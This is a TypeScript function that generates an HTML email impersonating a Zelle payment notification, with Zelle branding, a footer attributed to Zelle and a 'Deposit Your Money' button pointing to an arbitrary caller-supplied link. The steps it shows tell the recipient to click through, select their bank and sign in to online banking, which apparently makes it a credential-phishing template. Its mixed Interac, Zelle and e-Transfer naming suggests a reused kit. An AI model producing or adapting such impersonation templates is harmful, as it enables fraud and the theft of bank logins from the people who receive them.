interface EmailData {
  recipientName: string
  amount: number
  message?: string
  securityQuestion: string
  securityAnswer?: string
  transferId: string
  depositLink: string
  senderName?: string
  institution?: string
}

export function generateInteracEmailHtml(data: EmailData): string {
  const {
    recipientName,
    amount,
    message,
    securityQuestion,
    securityAnswer,
    transferId,
    depositLink,
    senderName = "Your Institution",
    institution = "Banking System",
  } = data
  
  // Mask the security answer for display
  const maskedAnswer = securityAnswer ? "●".repeat(Math.min(securityAnswer.length, 8)) : "●●●●●●●●"

  const formattedAmount = amount.toFixed(2)
  const currentDate = new Date().toLocaleDateString("en-US", {
    year: "numeric",
    month: "long",
    day: "numeric",
  })

  const currentDateFr = new Date().toLocaleDateString("fr-CA", {
    year: "numeric",
    month: "long",
    day: "numeric",
  })

  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Zelle Payment</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, Helvetica, sans-serif;
      background-color: #F3F3F3;
      color: #333333;
    }
    .email-container {
      max-width: 700px;
      margin: 40px auto;
      background-color: #ffffff;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
    }
    .topbar {
      background-color: #000000;
      padding: 14px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 12px;
    }
    .topbar-left {
      display: flex;
      align-items: center;
      gap: 16px;
    }
    .topbar img {
      height: 50px;
      display: block;
    }
    .dba {
      display: flex;
      align-items: center;
      color: rgba(255, 255, 255, 0.7);
      font-weight: 500;
      font-size: 13px;
      line-height: 50px;
      letter-spacing: 0.3px;
    }
    .topbar-right {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .brand {
      display: flex;
      align-items: center;
      color: rgba(255, 255, 255, 0.7);
      font-weight: 500;
      font-size: 13px;
      letter-spacing: 0.3px;
    }
    .content-wrapper {
      padding: 32px 24px;
    }
    
    .greeting-section h1 {
      font-size: 24px;
      margin-bottom: 16px;
      color: #000000;
    }
    .greeting-section p {
      font-size: 15px;
      line-height: 1.6;
      margin-bottom: 12px;
    }
    .amount-box {
      background-color: #6D1ED4;
      color: #ffffff;
      padding: 16px;
      border-radius: 6px;
      font-size: 18px;
      font-weight: bold;
      text-align: center;
      margin: 24px 0;
    }
    .details-card {
      background-color: #ffffff;
      border: 1px solid #dddddd;
      border-radius: 8px;
      padding: 20px;
      margin: 20px 0;
    }
    .details-card h3 {
      font-weight: bold;
      font-size: 16px;
      margin-bottom: 16px;
      margin-top: 0;
    }
    .detail-row {
      display: flex;
      justify-content: space-between;
      padding: 12px 0;
      border-bottom: 1px solid #f0f0f0;
    }
    .detail-row:last-child {
      border-bottom: none;
    }
    .detail-label {
      font-weight: 600;
      color: #666666;
      font-size: 14px;
    }
    .detail-value {
      color: #000000;
      font-size: 14px;
      text-align: right;
    }
    .message-box {
      background-color: #f9f9f9;
      border-left: 4px solid #6D1ED4;
      padding: 16px;
      margin: 20px 0;
      border-radius: 4px;
    }
    .message-box strong {
      display: block;
      margin-bottom: 8px;
      color: #000000;
    }
    .security-section {
      background-color: #f5f0ff;
      border: 2px solid #6D1ED4;
      border-radius: 8px;
      padding: 20px;
      margin: 20px 0;
    }
    .security-section h4 {
      margin: 0 0 12px 0;
      font-size: 16px;
      color: #000000;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .security-toggle {
      position: relative;
    }
    .security-question-text {
      margin: 0 0 8px 0;
      font-size: 14px;
      color: #333333;
      word-break: break-word;
    }
    .security-answer {
      background-color: #ffffff;
      border: 1px solid #dddddd;
      padding: 12px;
      border-radius: 4px;
      margin-top: 8px;
      color: #000000;
      font-size: 14px;
    }
    .security-answer strong {
      font-weight: 600;
    }
    .reveal-text {
      color: #555555;
      font-size: 13px;
      margin-top: 12px;
      line-height: 1.5;
      background-color: #fff3cd;
      padding: 10px 12px;
      border-radius: 4px;
      border-left: 3px solid #ffc107;
    }
    .reveal-text strong {
      color: #333333;
    }
    .button-section {
      text-align: center;
      margin: 32px 0;
    }
    .deposit-button {
      background-color: #6D1ED4;
      color: #ffffff;
      padding: 14px 30px;
      font-weight: bold;
      text-decoration: none;
      border-radius: 6px;
      display: inline-block;
      font-size: 16px;
      transition: background-color 0.2s;
    }
    .deposit-button:hover {
      background-color: #5A18B0;
    }
    .instructions {
      background-color: #f9f9f9;
      padding: 20px;
      border-radius: 8px;
      margin: 24px 0;
    }
    .instructions h4 {
      margin-top: 0;
      font-size: 16px;
    }
    .instructions ol {
      margin: 8px 0;
      padding-left: 20px;
    }
    .instructions li {
      margin: 8px 0;
      font-size: 14px;
      line-height: 1.6;
    }
    .security-notice {
      font-size: 13px;
      color: #666666;
      font-style: italic;
      text-align: center;
    }
    .footer {
      background-color: #f1f1f1;
      padding: 16px;
      font-size: 12px;
      color: #666666;
      text-align: center;
    }
    .footer a {
      color: #2563eb;
      text-decoration: none;
    }
    @media only screen and (max-width: 600px) {
      .topbar {
        padding: 12px;
      }
      .topbar-left,
      .topbar-right {
        flex-direction: column;
        align-items: flex-start;
        width: 100%;
      }
      .detail-row {
        flex-direction: column;
        gap: 4px;
      }
      .detail-value {
        text-align: left;
      }
    }
  </style>
</head>
<body>
  <div class="email-container">
    <div class="topbar">
      <div class="topbar-left">
        <div style="width:40px;height:40px;background:#6D1ED4;border-radius:8px;display:inline-flex;align-items:center;justify-content:center;font-weight:900;font-size:22px;color:#fff;line-height:1;">Z</div>
        <div class="dba">Partnered with QuantumYield</div>
      </div>
      <div class="topbar-right">
        <div class="brand">e-Transfer</div>
      </div>
    </div>

    <div class="content-wrapper">
        <div class="greeting-section">
          <h1>Hi ${recipientName},</h1>
          <p>You&apos;ve received a secure Zelle payment.</p>

          <div class="amount-box">
            Amount: $${formattedAmount} USD
          </div>

          <div class="details-card">
            <h3>Transfer Details</h3>
            <div class="detail-row">
              <span class="detail-label">Date:</span>
              <span class="detail-value">${currentDate}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">From:</span>
              <span class="detail-value">${institution}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Transfer ID:</span>
              <span class="detail-value">${transferId}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Amount:</span>
              <span class="detail-value">$${formattedAmount} USD</span>
            </div>
          </div>

          ${
            message
              ? `<div class="message-box">
            <strong>Message (Optional):</strong>
            ${message}
          </div>`
              : ""
          }

          <div class="security-section">
            <h4>
              <span>🔒</span>
              <span>Security Question</span>
            </h4>
            <div class="security-toggle">
              <p class="security-question-text">${securityQuestion}</p>
              <div class="security-answer">
                <strong>Answer:</strong> ${maskedAnswer}
              </div>
              <p class="reveal-text">
                <strong>Important:</strong> The sender must provide you with the security answer to complete this deposit. Contact the sender directly if you have not received the answer. This step is required for security verification and transaction validation.
              </p>
            </div>
          </div>

          <div class="button-section">
            <a href="${depositLink}" class="deposit-button">Deposit Your Money</a>
          </div>

          <div class="instructions">
            <h4>How to deposit:</h4>
            <ol>
              <li>Click the "Deposit Your Money" button above.</li>
              <li>Select your financial institution.</li>
              <li>Sign in to your online banking.</li>
              <li>Answer the security question.</li>
              <li>Choose which account to deposit the money into.</li>
            </ol>
          </div>

          <p class="security-notice">
            This is a secure transaction. For your security, please do not forward this email as it contains confidential information meant only for you.
          </p>
        </div>
    </div>

    <div class="footer">
      <p>© ${new Date().getFullYear()} Zelle. This email was sent on behalf of <strong>${institution}</strong> at <strong>${senderName}</strong>.</p>
      <p style="margin-top: 8px;">
        <a href="https://www.zellepay.com/terms-of-use">Terms of Use</a>
      </p>
      <p style="margin-top: 8px;">This is an automated email. Please do not reply to this message.</p>
    </div>
  </div>

  
</body>
</html>
`
}

export type EmailLang = "en" | "fr"
export type EmailLangMode = EmailLang | "dual"

export function renderInteracEmail(data: EmailData, mode: EmailLangMode = "en"): string {
  return generateInteracEmailHtml(data)
}
